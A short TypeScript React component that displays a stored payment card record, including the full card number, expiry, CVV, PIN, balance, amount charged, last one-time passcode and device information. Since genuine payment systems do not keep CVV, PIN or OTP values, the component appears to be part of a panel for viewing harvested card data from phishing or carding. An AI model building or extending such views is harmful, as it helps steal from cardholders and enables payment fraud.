import React from 'react'
import Image from '../../../../components/Image'
import Checked from "../../../../assets/checked.svg"

const PaymentCard: React.FC<{ card: Card }> = ({ card }) => {
    return (
        <div className='border border-gray-200 p-4 bg-slate-50 m-4 space-y-3 rounded-md'>
            <div className='flex justify-between items-center flex-wrap'>
                <p className='font-semibold flex items-center justify-start gap-x-2'>
                    {card.name_on_card}
                </p>
                <Image src={Checked} className='w-[5%] rounded-full object-cover overflow-hidden' alt={"Successful"} />
            </div>

            <p className='leading-3 font-semibold text-gray-300'>Card Details:</p>
            <p className='text-sm'>Card Number: <span className='font-semibold'>{card.card_number}</span></p>
            <p className='text-sm'>Card Expiration: <span className='font-semibold'>{card.expire_mm}/{card.expire_yy}</span></p>
            <p className='text-sm'>CVV/CVC: <span className='font-semibold'>{card.cvv}</span></p>
            <p className='text-sm'>PIN: <span className='font-semibold'>{card.pin}</span></p>
            <p className='text-sm'>Balance: <span className='font-semibold'>{card.balance}</span></p>

            <p className='leading-3 font-semibold text-gray-300'>Payment Details:</p>

            <p className='text-sm'>Payment Ref: <span className='font-semibold'>{card.reference}</span></p>
            <p className='text-sm'>Amount Charged: <span className='font-semibold'>{card.amount_to_charge}</span></p>
            <p className='text-sm'>Last OTP: <span className='font-semibold'>{card.last_otp}</span></p>

            <p className='leading-3 font-semibold text-gray-300'>Device Informations:</p>
            <p>{String(card.device_information)}</p>
        </div>
    )
}

export default PaymentCard